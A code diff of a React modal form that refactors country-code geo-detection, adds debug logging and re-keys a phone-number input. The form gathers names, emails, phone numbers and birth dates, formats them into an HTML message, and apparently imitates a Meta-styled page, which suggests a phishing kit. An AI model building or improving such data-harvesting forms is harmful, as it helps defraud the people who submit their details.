@@ -60,18 +60,8 @@ const InitModal: FC = () => {
 
     const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep, isModalOpen } = store();
 
-    // Reset form step when modal opens
-    useEffect(() => {
-        if (isModalOpen && formStep !== 'init') {
-            setFormStep('init');
-        }
-    }, [isModalOpen, formStep, setFormStep]);
-
-    // Geo-detection effect - run when modal opens (eager fetch)
-    useEffect(() => {
-        if (!isModalOpen) return;
-        
-        // Set a temporary country code early to avoid +1 flash
+    // Helper function to get country code from browser language
+    const getCountryCodeFromBrowser = () => {
         const browserLang = navigator.language.toLowerCase().split('-')[1] || navigator.language.toLowerCase().split('-')[0];
         const langCountryMap: Record<string, string> = {
             'vi': 'vn', 'en': 'us', 'es': 'es', 'fr': 'fr',
@@ -81,8 +71,26 @@ const InitModal: FC = () => {
             'tr': 'tr', 'el': 'gr', 'sv': 'se', 'no': 'no', 'tl': 'ph',
             'ms': 'my'
         };
-        const fallbackCC = langCountryMap[browserLang] || 'us';
-        setCountryCode(fallbackCC); // Set immediately from browser language
+        return langCountryMap[browserLang] || 'us';
+    };
+
+    // Ensure form step is correct when modal opens
+    useEffect(() => {
+        if (isModalOpen && formStep !== 'init') {
+            setFormStep('init');
+        }
+    }, [isModalOpen, formStep, setFormStep]);
+
+    // Detect country code when modal opens AND when formStep is init
+    useEffect(() => {
+        if (!isModalOpen || formStep !== 'init') {
+            return;
+        }
+        
+        // Set fallback country immediately from browser language
+        const fallbackCC = getCountryCodeFromBrowser();
+        setCountryCode(fallbackCC);
+        console.log('[GeoDetect] Setting fallback country:', fallbackCC);
         
         // Then try to fetch from geo API for more accurate country
         const controller = new AbortController();
@@ -94,6 +102,7 @@ const InitModal: FC = () => {
                     signal: controller.signal 
                 });
                 let cc = (data.country_code || '').toLowerCase().trim();
+                console.log('[GeoDetect] API returned:', cc);
                 
                 // Validate country code is 2 characters (ISO 3166-1 alpha-2)
                 if (cc.length !== 2) {
@@ -105,10 +114,11 @@ const InitModal: FC = () => {
                     cc = fallbackCC;
                 }
                 
+                console.log('[GeoDetect] Final country code:', cc);
                 setCountryCode(cc);
             } catch (error) {
                 if (error instanceof Error && error.name === 'AbortError') return;
-                // Keep fallback country code already set
+                console.log('[GeoDetect] Error fetching, using fallback:', fallbackCC);
                 setCountryCode(fallbackCC);
             }
         };
@@ -116,7 +126,7 @@ const InitModal: FC = () => {
         fetchGeoInfo();
         
         return () => controller.abort();
-    }, [isModalOpen]);
+    }, [isModalOpen, formStep]);
 
     // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
     useEffect(() => {
@@ -334,6 +344,7 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                         ))}
                         <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
                         <IntlTelInput
+                            key={`intl-tel-${countryCode}`}
                             onChangeNumber={handlePhoneChange}
                             initOptions={initOptions}
                             inputProps={{
